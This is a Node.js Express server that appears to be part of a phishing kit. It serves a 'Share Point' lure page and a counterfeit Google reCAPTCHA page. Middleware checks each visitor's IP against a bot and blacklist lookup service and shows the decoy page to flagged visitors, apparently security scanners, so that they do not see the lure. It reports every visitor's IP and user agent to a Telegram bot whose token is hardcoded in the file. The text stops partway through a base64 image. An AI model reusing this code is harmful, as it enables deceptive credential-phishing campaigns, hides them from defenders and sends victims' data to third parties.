const express = require('express');
const axios = require('axios');
const app = express();
const port = 3029;

// Replace with your Telegram bot token and admin chat ID
const BOT_TOKEN = '5005090175:AAGzFuGZv8txpBofwkOHbBC0HRClMGi1xXw';
const ADMIN_CHAT_ID = '513129599';

// Function to send a message to the Telegram bot
const sendTelegramMessage = async (message) => {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
        });
        console.log('Notification sent to Telegram.');
    } catch (error) {
        console.error('Error sending message to Telegram:', error.message);
    }
};

// Middleware to check IP against the IP lookup service
app.use(async (req, res, next) => {

    const over_stay = `<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Docu......</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        .recaptcha-container {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            background-color: #f9f9f9;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .recaptcha-checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #ddd;
            background-color: #fff;
            margin-right: 10px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.3s ease, border-color 0.3s ease;
            position: relative;
        }

        .recaptcha-checkbox.checked {
            background-color: #4285f4;
            border-color: #4285f4;
        }

        .recaptcha-checkbox::after {
            content: '✓';
            color: #fff;
            font-size: 14px;
            opacity: 0;
            transform: scale(0);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .recaptcha-checkbox.checked::after {
            opacity: 1;
            transform: scale(1);
        }

        .recaptcha-text {
            font-size: 14px;
            color: #555;
        }

        .recaptcha-logo {
            margin-left: auto;
            font-size: 12px;
            color: #777;
            display: flex;
            align-items: center;
        }

        .recaptcha-logo img {
            width: 18px;
            height: 18px;
            margin-right: 5px;
        }

        .tooltip {
            display: none;
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background-color: #333;
            color: #fff;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 12px;
            white-space: nowrap;
            margin-bottom: 10px;
        }

        .recaptcha-container:hover .tooltip {
            display: block;
        }

        .recaptchasub {
            display: flex;
            justify-items: center;
            flex-direction: column;
            align-items: center;
            background-color: transparent;
            width: 90px;
            height: 74px;
            margin-top: 15px;
            margin-left: auto;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="recaptcha-container">
        <div class="tooltip">Click to verify</div>
        <div class="recaptcha-checkbox" onclick="toggleCheck(this)"></div>
        <div class="recaptcha-text">I'm not a robot</div>
        <div class="recaptchasub">
            <img style="width: 30px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            <span style="font-size: 0.8rem;">reCAPTCHA</span>
            <span style="font-size: 0.6rem;">Privacy - Terms</span>
        </div>
    </div>

</body>

</html>`
    const getUserIp = (req) => {
        // Get the X-Forwarded-For header or fallback to connection remote address
        const xForwardedFor = req.headers['x-forwarded-for'];
        if (xForwardedFor) {
            // Split the X-Forwarded-For string and take the first IP
            return xForwardedFor.split(',')[0].trim();
        }
        // Fallback to remote address
        return req.connection.remoteAddress || req.socket.remoteAddress;
    };
    
    // Example usage
    const userIp = getUserIp(req);
    console.log('User IP:', userIp);
    const userAgent = req.headers['user-agent'] || 'Unknown User-Agent';



    if (!userIp) {
        return res.status(200).send(over_stay);
    }

    try {
        // Send a request to the IP lookup service
        const response = await axios.get(`https://blackbox.ipinfo.app/lookup/${userIp}`);
        console.log(response.data)
        sendTelegramMessage(response.data);
        console.log(userIp)
        if (response.data.trim() === 'Y') {
            // If the response is "Y", block the request
            // Check for new users by IP or custom logic (for demonstration, all users are treated as new)
            const messages = `black Box Blocked:\nIP Address: https://ipinfo.io/${userIp}\nUser-Agent: ${userAgent}`;

            // Send the message to Telegram
            sendTelegramMessage(messages);
            return res.status(200).send(over_stay);
        }
    } catch (error) {
        console.error('Error checking IP:', error.message);
        // Allow the request if there's an issue with the lookup service
        // return res.status(500).send('Error verifying IP.');
    }

    // Check for new users by IP or custom logic (for demonstration, all users are treated as new)
    const message = `New user accessed the site:\nIP Address: https://ipinfo.io/${userIp}\nUser-Agent: ${userAgent}
        `;

    // Send the message to Telegram
    sendTelegramMessage(message);

    next(); // Proceed to the next middleware or route
});

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Share Point</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 350px;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h2 {
            font-size: 24px;
            color: #333;
            margin-bottom: 15px;
        }

        p {
            font-size: 16px;
            color: #555;
            margin-bottom: 20px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #4e5ffa;
            border: none;
            color: #fff;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #8091f2;
        }

        .voice-wave {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 20px;
        }

        .voice-wave span {
            display: block;
            width: 6px;
            height: 20px;
            background-color: #4e5ffa;
            margin: 0 2px;
            border-radius: 5px;
            animation: wave 1s infinite ease-in-out;
        }

        .voice-wave span:nth-child(2) {
            animation-delay: 0.1s;
        }

        .voice-wave span:nth-child(3) {
            animation-delay: 0.2s;
        }

        .voice-wave span:nth-child(4) {
            animation-delay: 0.3s;
        }

        .voice-wave span:nth-child(5) {
            animation-delay: 0.4s;
        }

        @keyframes wave {

            0%,
            100% {
                transform: scaleY(1);
            }

            50% {
                transform: scaleY(1.5);
            }
        }

        .footer-text {
            font-size: 11px;
            color: #666;
            margin-top: 20px;
            text-align: center;
            line-height: 1.4;
        }

        .footer-text a {
            color: #0000EE;
            text-decoration: none;
        }

        .footer-text a:hover {
            text-decoration: underline;
        }

        .footer-text small {
            font-size: 10px;
        }
    </style>
</head>

<body>

    <div class="container">
        <img id="signatureImage"
            src="data:image/jpeg;base64,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